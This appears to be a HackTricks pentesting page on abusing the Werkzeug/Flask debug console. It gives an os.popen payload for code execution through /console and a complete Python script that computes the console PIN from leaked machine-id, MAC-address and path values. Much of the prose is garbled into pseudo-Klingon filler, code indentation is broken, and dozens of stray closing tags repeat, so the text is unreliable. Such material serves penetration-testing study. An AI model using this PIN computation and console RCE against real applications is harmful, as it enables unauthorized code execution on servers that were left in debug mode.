# Werkzeug / Flask Debug

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Instantly available setup for vulnerability assessment & penetration testing**. Run a full pentest from anywhere with 20+ tools & features that go from recon to reporting. We don't replace pentesters - we develop custom tools, detection & exploitation modules to give them back some time to dig deeper, pop shells, and have fun.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

If debug is active you could try to access to `/console` and gain RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

ghItlhlaHchugh, [ghaH ](https://github.com/its-arun/Werkzeug-Debug-RCE)metasploit vItlhutlh.

## Pin Protected - Path Traversal

qaStaHvIS **`/console`** endpoint vItlhutlh. **file traversal vulnerability** vItlhutlh, 'e' vItlhutlh pin vItlhutlh generate vItlhutlh info vItlhutlh leak.

### Werkzeug Console PIN Exploit

app debug error page vItlhutlh force vItlhutlh:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
# **`get_machine_id()`** code
```python
def get_machine_id():
    try:
        with open('/etc/machine-id', 'rb') as f:
            return f.read().strip().decode('ascii')
    except IOError:
        try:
            with open('/proc/sys/kernel/random/boot_id', 'rb') as f:
                return f.read().strip().decode('ascii')
        except IOError:
            with open('/proc/self/cgroup', 'rb') as f:
                for line in f:
                    if line[0:12] == b'1:name=systemd':
                        return line.split(b'/')[-1].strip().decode('ascii')
    return ''
```
</details>

Once the `probably_public_bits` and `private_bits` variables are obtained, the console PIN can be calculated using the following formula:
```python
pin = hashlib.md5((probably_public_bits + private_bits).encode('utf-8')).hexdigest()[:10]
```

To unlock the console, the calculated PIN must be entered. If successful, the console will be accessible, allowing for further exploitation and analysis.
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>

</details>
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{%
hint style="success"
%}
**ghItlhvam** vItlhutlh **Werkzeug** **ghItlhvam** **ghItlhvam** **md5** **sha1** **hashing algorithm** **tagh** **vItlhutlh**.
{%
endhint
%}

## **References**

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**vulnerability assessment & penetration testing** **ghItlhvam** **vItlhutlh** **20+ tools & features** **recon to reporting**. **pentesters** **vItlhutlh** - **custom tools, detection & exploitation modules** **vItlhutlh** **time to dig deeper, pop shells, and have fun**.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

**HackTricks** **vItlhutlh** **support** **ghItlhvam**:

* **company advertised in HackTricks** **download HackTricks in PDF** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **tagh** **ghItlhvam**!
* **official PEASS & HackTricks swag** [**peass.creator-spring.com**](https://peass.creator-spring.com)
* **The PEASS Family** [**opensea.io/collection/the-peass-family**](https://opensea.io/collection/the-peass-family) **NFTs** [**opensea.io/collection/the-peass-family**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** [**t.me/peass**](https://t.me/peass) **follow** **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) **HackTricks Cloud** [**github repos**](https://github.com/carlospolop/hacktricks-cloud).

</details>
